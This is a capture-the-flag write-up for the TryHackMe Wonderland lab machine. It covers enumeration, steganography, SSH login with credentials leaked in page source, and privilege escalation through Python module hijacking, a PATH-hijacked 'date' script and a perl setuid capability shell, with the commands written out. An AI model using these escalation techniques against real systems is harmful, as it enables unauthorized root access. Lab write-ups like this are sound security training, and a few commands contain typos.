this write-up, I will walk through the Wonderland room on TryHackMe,\na medium-difficulty challenge that focuses on enumeration, privilege escalation, and creative problem-solving.\nI completed this machine from start to finish and documented each step clearly so that anyone reading this can follow the same process and understand the techniques involved.The goal of this write-up is to demonstrate me methodology, explain why each step was taken, and highlight the key points that lead to gaining full access to the machine.\nYou will also find a screenshot of the room details attached below. <img alt=\"2025-12-11_15-53.png\" src=\"images/2025-12-11_15-53.png\" target=\"_self\">To begin the enumeration process, I conducted a basic port scan using the following Nmap command. The results show two open ports requiring further investigation :\nnmap -sV -sC -O 10.67.165.26\n<br><img alt=\"nmap.png\" src=\"images/nmap.png\" target=\"_self\"> We will also use the gobuster tool on the website. gobuster dir -u http://10.67.165.26/ -w wordlists/common.txt\n<br><img alt=\"gobuster.png\" src=\"images/gobuster.png\" target=\"_self\">Now we go to the /img file shown by gobuster tool and load the following image. http://10.67.165.26/img\nhttp://10.67.165.26/img/white_rabbit_1.jpg\nwget http://10.67.165.26/img/white_rabbit_1.jpg\n<br><img alt=\"2025-12-11_11-48.png\" src=\"images/2025-12-11_11-48.png\" target=\"_self\"><br><img alt=\"2025-12-11_11-49.png\" src=\"images/2025-12-11_11-49.png\" target=\"_self\">After downloading the image, we will use the steghide tool like below command. steghide info white_rabbit_1.jpg\nsteghide extract -sf white_rabbit_1.jpg\ncat hint.txt\n<br><img alt=\"2025-12-11_11-43.png\" src=\"images/2025-12-11_11-43.png\" target=\"_self\">Now that we have read the hint in the text we can follow it in to the page. http://10.67.165.26/r/a/b/b/i/t/\n<br><img alt=\"2025-12-11_15-50.png\" src=\"images/2025-12-11_15-50.png\" target=\"_self\">Then go to the source code of the page and we can see the username and password <br><img alt=\"2025-12-11_11-53.png\" src=\"images/2025-12-11_11-53.png\" target=\"_self\">Now we will login via the SSH port using the username password we obtained from the page source code ssh alice@10.67.165.26\n<br><img alt=\"2025-12-11_11-56.png\" src=\"images/2025-12-11_11-56.png\" target=\"_self\">Now we have logged in as a alice user and we can read the user.txt flag\ncat /root/user.txt\n<br><img alt=\"2025-12-11_12-14.png\" src=\"images/2025-12-11_12-14.png\" target=\"_self\">So how did I switch the user ?\nI made a file named random.py since that’s the module we want to hijack\nin the file I typed:\nimport os\nos.system(“/bin/bash”)\nI ran the command sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\nIt gave me the user rabbit which means I successfully managed to switch my first privilege.\ncat &gt; random.py &lt;&lt; EOF\nimport os `` os.system(\"/bin/bash\") EOF` sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\n<br><img alt=\"2025-12-11_12-20.png\" src=\"images/2025-12-11_12-20.png\" target=\"_self\">Now we made a date file so that we can read the password file and switch to hatter user\nyou can follow below commands. cat &gt; date &lt;&lt; EOF\n#!/bin/bash\n/bin/bash\nEOF chmod +x date\nexprt PATH=/home/rabbit:$PATH\n./teaParty\nWe now have permission to access the hatter folder and read the password.txt\ncd /home/hatter\ncat password.txt\n<br><img alt=\"2025-12-11_13-01.png\" src=\"images/2025-12-11_13-01.png\" target=\"_self\">we will use the command :\ngetcap -r / 2&gt;/dev/null\n<br><img alt=\"2025-12-11_13-02.png\" src=\"images/2025-12-11_13-02.png\" target=\"_self\">\nThere is perl capability that we can exploit.\nhttps://gtfobins.github.io/gtfobins/perl/ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n<br><img alt=\"2025-12-11_12-41.png\" src=\"images/2025-12-11_12-41.png\" target=\"_self\">I hope this report has been a helpful guide through Wonderland.
